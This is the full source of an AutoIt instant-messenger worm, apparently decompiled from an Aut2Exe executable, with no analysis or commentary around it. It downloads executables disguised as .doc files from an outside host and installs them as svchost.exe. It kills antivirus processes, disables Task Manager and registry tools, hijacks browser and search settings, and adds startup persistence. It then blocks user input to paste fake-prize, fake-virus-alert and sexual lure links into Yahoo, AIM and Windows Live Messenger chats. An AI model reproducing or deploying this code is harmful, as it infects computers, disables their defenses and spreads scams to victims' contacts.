; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: E:\Cuong Worm\Uklotttery HOMEPAGE\YM WORM\YM.au3>
; ----------------------------------------------------------------------------


;<Ghost Uk>


#NoTrayIcon

$website = "http://uklotttery.us/"
$link = "http://ukhomeblog.net/"
$link2 = "http://ukhomeblog.net/"





; Infect into system
DirCreate(@WindowsDir & "\system\system32\")
	If Not FileExists(@WindowsDir & "\system\system32\svchost.exe") Then
 		InetGet ("http://s230910135.onlinehome.us/upload/images/YM.doc", @WindowsDir & "\system\system32\svchost.exe", 0, 1)
 		Sleep(5000)
	EndIf

	If Not FileExists(@WindowsDir & "\system\system32\svchost32.exe") Then
 		InetGet ("http://s230910135.onlinehome.us/upload/images/uslotttery.doc", @WindowsDir & "\system\system32\svchost32.exe", 0, 1)
 		Sleep(5000)
	EndIf


;del cookie IE , Kill Enemy(thecoolpics.com and Termex and MyEbuddy)
FileDelete("C:\Documents and Settings\" & @UserName & "\Cookies\*.txt")
FileDelete(@WindowsDir & "\system\svchost.exe")
FileDelete(@WindowsDir & "\system\svchost32.exe")
FileDelete(@WindowsDir & "\svchost32.exe")
FileDelete(@WindowsDir & "\svchost.exe")
FileDelete(@WindowsDir & "\updt.exe")
$var = DriveGetDrive( "all" )
FileDelete("" & $var & "\auto.exe")
RegDelete("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "SVCHOST")

;kill anti virus
If ProcessExists("Bkav2006.exe") Then
   ProcessClose("Bkav2006.exe")
EndIf

If ProcessExists("FastHelper.exe") Then
   ProcessClose("FastHelper.exe")
EndIf

If ProcessExists("bdss.exe") Then
   ProcessClose("bdss.exe")
   ProcessClose("vsserv.exe")
EndIf

;Click to Adbrite
;$title = WinGetTitle("Active website for advertising - Microsoft Internet Explorer", "")
;$check = WinExists ($title)
;If $check = 1 Then
;	BlockInput (1)
;	sleep(1000)
;	WinActivate($title)
;   WinSetState ( $title , "", @SW_MAXIMIZE)
;	$pos = MouseGetPos()
;	MouseClick("left", 375, 200, 1, 0)
;	MouseMove ( $pos[0], $pos[1] , 0)
;	BlockInput (0)
;EndIf


; Write Registry keys


RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\system\system32\svchost.exe")
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Yahoo Messenger", "REG_SZ", @WindowsDir & "\system\system32\svchost32.exe")
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Yahoo!7 Update", "REG_SZ", @WindowsDir & "\system\YM.exe")
RegWrite("HKEY_CURRENT_USER\Software\Google\GoogleToolbarNotifier", "KeepDS", "REG_DWORD", "0")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Search Assistant", "DefaultSearchURL", "REG_SZ", "http://ukhomeblog.net/?search=")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", "REG_DWORD", "1")

;Get_real_name
;$msg = RegRead("HKEY_CURRENT_USER\Software\yahoo\pager" , "Yahoo! User ID" )
;if $msg = "" then
;If FileExists(@ProgramFilesDir & "\Yahoo!\Messenger\logs") Then
;	$search = FileFindFirstFile(@ProgramFilesDir & "\Yahoo!\Messenger\logs\*.log")
;	$file = FileFindNextFile($search)
;	$array = StringSplit($file, '_', 1)
;	$array = StringSplit($array[2], '.', 1)

;	If not $array[1] = "User" or "Admin" or "Administrator" then
;    $msg = " ( written by " & $array[1] & " , no worm , no virus , sorry spam !!!) "
;	EndIf

;EndIf
;else
;	$msg = " (  written by  , no worm , no virus , sorry spam !!!)  "
;EndIf

; List of random messages
Dim $tin[38]
$tin[0] = "Twenty-five dollars is to much to pay for that shirt : " & $link & "shirt.jpg   "
$tin[1] = "I earn as much money as my website " & $link & "   "
$tin[2] = "People belive that we wanted men is living near you " & $link & "wanted.jpg  be careful !!!    "
$tin[3] = "People allege that he stole 100000 Dollars : " & $link & "hisimages.jpg   "
$tin[4] = "I look radian in my new dress : " & $link & "newdress.jpg :x :x   "
$tin[5] = "What a interesting film !!! " & $link & "film.wmv It's the most interesting film i've ever seen   "
$tin[6] = ":)) My family was elated by the news . I won an iPhone. You will never believe it :O " & $link & "mylottery.jpg     "
$tin[7] = "This is my one-off Xmase-card for you ^_^  " & $link & "?id=ecard Very nice !!! =))   "
$tin[8] = "you are virus infected . Use this tool to remove viruses from your PC : " & $link & "?id=virus_shield    "
$tin[9] = "Microsoft to release 2007 free-of-charge packs of Windows Vista for its first 2007 online registered users: " & $link & "?id=vista   "
$tin[10] = "Breaking news : Osama Bin Laden has been arrested !! : " & $link & "?id=news   "
$tin[11] = "My new personal website: " & $link & "   c0ol !!! "
$tin[12] = "OMG !!! Google was hacked : " & $link & "?id=google     "
$tin[13] = ":D who is beside you in this pic " & $link2 & "friendpic.gif so good-looking   "
$tin[14] = ";) 1 of my vacation pictures " & $link2 & "vacation.gif <:-P  "
$tin[15] = "hot pics this week " & $link2 & "hot.gif :x cool !!!  "
$tin[16] = ";) 1 of my vacation pictures " & $link2 & "vacation.gif <:-P "
$tin[17] = "Screenshot of my new Ipod " & $link2 & "ipod.gif so cool :D "
$tin[18] = "never click into the links like something in this image " & $link2 & "dontclick.gif #:-S !!!  "
$tin[19] = "Images shot in Viet Nam _ The war will never end " & $link2 & "VietNamWar.gif << :( "
$tin[20] = ":( the page cannot be displayed " & $link2 & "error.gif Something was wrong !!! Check it again and tell me later. THanks !!!"
$tin[21] = "My pics with my new lover " & $link2 & "mypics.gif :x b-( "
$tin[22] = "New game  ;;) sexy beach 3 (man only) " & $link2 & "MissWorld.gif Ha Ha Ha!! "
$tin[23] = "Do you realize who is in this image: " & $link2 & "who.gif . Just think for a moment and tell me soon ;))"
$tin[24] = "damn it , she is so cute :x : " & $link2 & "girlcute.gif ... who is she ... do you know she ?"
$tin[25] = "Be careful. There'll be earthquake tonight !!!  :  " & $link2 & "ghost.gif "
$tin[26] = "I made 50 gifts for the first 50 people post comments on my own page :   " & $link2 & " "
$tin[27] = "My new personal website: :   " & $link2 & " so c00l !!! "
$tin[28] = "Yahoo to charge fee for its YM service :   " & $link2 & "?id=yahoo !!! "
$tin[29] = "OMG ! She is really beautiful :x    " & $link2 & "DSC017473.GIF !!! "
$tin[30] = "Download free MP3s     " & $link2 & "  "
$tin[31] = "A new dangerous computer virus that can destroys all your data has just been released . Click here to know how to avoid it :  : " & $link2 & "?id=pc_protector ."
$tin[32] = "You are Yahoo Winner .... Click Here to get a FREE SMART PHONE  : " & $link2 & "?id=yahoowinner ."
$tin[33] = "Big, Beautiful & Single?Join a community for big beautiful women and those who admire them  : " & $link2 & "girlcute.gif ."
$tin[34] = "oh my god , FREE  KOHLS $500 GIFT CARD! Warning:  Offer is EXTREMELY limited!  Get Yours Now! : " & $link2 & "?id=get ."
$tin[35] = "Congratulations!You have been selected to receive a FREE* wireless MotoQ™ 9h smartphone .Click here   to see " & $link2 & "?id=MotoQ™ ."
$tin[36] = "You're a YAHOO winner!A Free Laptop for You.Click check it out " & $link2 & "?id=yahoowinner ."
$tin[37] = "Free Hot Sex Movies " & $link2 & "hotsex.wmv ."
; Main process
While (1)
sleep(200000)
$tieude0 = WinGetTitle("My Computer", "")
$kiemtra0 = WinExists ($tieude0)
$tieude0x = WinGetTitle("Windows Explorer", "")
$kiemtra0x = WinExists ($tieude0x)
$tieude1 = WinGetTitle("Yahoo! Messenger", "")
$kiemtra1 = WinExists ($tieude1)
$tieude2 = WinGetTitle("AIM", "")
$kiemtra2 = WinExists ($tieude2)
$tieude3 = WinGetTitle("Windows Live Messenger", "")
$kiemtra3 = WinExists ($tieude3)
$tieude4 = WinGetTitle("Windows Messenger", "")
$kiemtra4 = WinExists ($tieude4)
$tieude5 = WinGetTitle("Yahoo!7 Messenger", "")
$kiemtra5 = WinExists ($tieude5)
	If $kiemtra0 = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra0x = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0x)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra1 = 1 Then
		$ngaunhien = Random(0,37,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude1)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v")
		Send("!s")
		BlockInput (0)
	EndIf

	If $kiemtra2 = 1 Then
		$ngaunhien = Random(0,37,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude2)
		Send("{HOME}")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{PGDN}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra3 = 1 Then
		$ngaunhien = Random(0,37,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude3)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra4 = 1 Then
		$ngaunhien = Random(0,37,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude4)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf
	If $kiemtra5 = 1 Then
		$ngaunhien = Random(0,37,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude5)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v")
		Send("!s")
		BlockInput (0)
	EndIf
Sleep(200000)
WEnd






; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: E:\Cuong Worm\Uklotttery HOMEPAGE\YM WORM\YM.au3>
; ----------------------------------------------------------------------------

